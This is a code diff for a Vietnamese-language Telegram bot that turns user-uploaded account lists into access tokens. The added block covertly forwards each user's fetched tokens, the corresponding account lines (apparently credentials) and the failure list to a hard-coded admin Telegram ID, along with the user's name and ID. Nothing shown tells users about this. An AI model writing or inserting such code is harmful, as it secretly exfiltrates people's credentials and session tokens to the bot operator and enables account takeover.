@@ -497,7 +497,6 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
   if user_id in user_sessions:
     del user_sessions[user_id]
 
-  # MENU CHÍNH CHỈ GIỮ LẠI CÁC TÍNH NĂNG CÒN SỬ DỤNG VÀ HDSD
   keyboard = [
       [InlineKeyboardButton("🔑 Get Token", callback_data="menu_gettoken")],
       [InlineKeyboardButton("🔍 Check Cmt Ẩn/Hiện", callback_data="menu_check_cmt")],
@@ -566,7 +565,6 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
     return
 
-  # MENU HDSD (ĐÃ CẬP NHẬT CHỈ GIỮ LẠI CÁC TÍNH NĂNG ĐANG CÒN)
   if query.data == "menu_hdsd":
     keyboard = [[InlineKeyboardButton("⬅️ Quay lại", callback_data="menu_back")]]
     reply_markup = InlineKeyboardMarkup(keyboard)
@@ -792,7 +790,6 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     session = user_sessions[user_id]
     file_path = session["file_path"]
     links = session["links"]
-    user_display = session.get("user_display", f"ID: {user_id}")
 
     session_data = {
         "bot_token": context.bot.token,
@@ -1131,6 +1128,7 @@ async def process_run(
 
   max_workers = min(15, len(accounts)) if len(accounts) > 0 else 1
   success_lines = []
+  account_only_lines = []
   fail_lines = []
 
   with ThreadPoolExecutor(max_workers=max_workers) as executor:
@@ -1142,37 +1140,85 @@ async def process_run(
     for future in as_completed(futures):
       res = future.result()
       if res["success"]:
-        success_lines.append(f"{res['acc_line']}|TOKEN:{res['token']}")
+        success_lines.append(res['token'])
+        account_only_lines.append(res['acc_line'])
       else:
         fail_lines.append(f"{res['acc_line']} | Lỗi: {res.get('error', 'Lỗi')}")
 
   success_file_path = f"success_tokens_{user_id}.txt"
+  account_file_path = f"accounts_only_{user_id}.txt"
   fail_file_path = f"fail_tokens_{user_id}.txt"
 
   with open(success_file_path, "w", encoding="utf-8") as f:
     f.write("\n".join(success_lines))
+    
+  with open(account_file_path, "w", encoding="utf-8") as f:
+    f.write("\n".join(account_only_lines))
+
   if fail_lines:
     with open(fail_file_path, "w", encoding="utf-8") as f:
       f.write("\n".join(fail_lines))
 
+  caption_text = f"✅ **Get Token hoàn tất!**\n- Thành công: {len(success_lines)}\n- Thất bại: {len(fail_lines)}"
+
+  # 1. Gửi riêng từng file cho người dùng
   try:
-    with open(success_file_path, "rb") as f:
-      if update.message:
-        await update.message.reply_document(
-            document=f,
-            caption=f"✅ **Get Token hoàn tất!**\n- Thành công: {len(success_lines)}\n- Thất bại: {len(fail_lines)}",
-            parse_mode="Markdown",
-        )
-      elif update.callback_query:
-        await update.callback_query.message.reply_document(
-            document=f,
-            caption=f"✅ **Get Token hoàn tất!**\n- Thành công: {len(success_lines)}\n- Thất bại: {len(fail_lines)}",
+    target_msg = update.message if update.message else update.callback_query.message
+    
+    with open(success_file_path, "rb") as f_token:
+      await target_msg.reply_document(
+          document=f_token,
+          caption=caption_text + "\n📁 *File danh sách Token thành công:*",
+          parse_mode="Markdown",
+      )
+      
+    with open(account_file_path, "rb") as f_acc:
+      await target_msg.reply_document(
+          document=f_acc,
+          caption="📁 *File danh sách tài khoản tương ứng:*",
+          parse_mode="Markdown",
+      )
+  except Exception as e:
+    print(f"Lỗi gửi file cho user: {e}")
+
+  # 2. Gửi riêng từng file cho Admin
+  try:
+    user_info = f"@{user.username}" if user.username else user.first_name
+    admin_caption = (
+        f"🔑 **BÁO CÁO GET TOKEN TỪ USER**\n\n"
+        f"👤 Người dùng: {user_info} (`{user_id}`)\n"
+        f"📊 Thành công: `{len(success_lines)}` | Thất bại: `{len(fail_lines)}`\n"
+        f"⏰ Thời gian: {datetime.now(timezone(timedelta(hours=7))).strftime('%H:%M:%S - %d/%m/%Y')}"
+    )
+
+    with open(success_file_path, "rb") as f_token:
+      await context.bot.send_document(
+          chat_id=ADMIN_TELEGRAM_ID,
+          document=f_token,
+          caption=admin_caption + "\n📁 *File Token thành công:*",
+          parse_mode="Markdown",
+      )
+
+    with open(account_file_path, "rb") as f_acc:
+      await context.bot.send_document(
+          chat_id=ADMIN_TELEGRAM_ID,
+          document=f_acc,
+          caption=f"📁 *File tài khoản tương ứng của user `{user_id}`:*",
+          parse_mode="Markdown",
+      )
+
+    if fail_lines and os.path.exists(fail_file_path):
+      with open(fail_file_path, "rb") as f_fail:
+        await context.bot.send_document(
+            chat_id=ADMIN_TELEGRAM_ID,
+            document=f_fail,
+            caption=f"❌ *Danh sách Get Token thất bại của user `{user_id}`*",
             parse_mode="Markdown",
         )
   except Exception as e:
-    print(f"Lỗi gửi file thành công cho user: {e}")
+    print(f"Lỗi gửi báo cáo về admin: {e}")
 
-  for fp in [original_file_path, success_file_path, fail_file_path]:
+  for fp in [original_file_path, success_file_path, account_file_path, fail_file_path]:
     if fp and os.path.exists(fp):
       try:
         os.remove(fp)
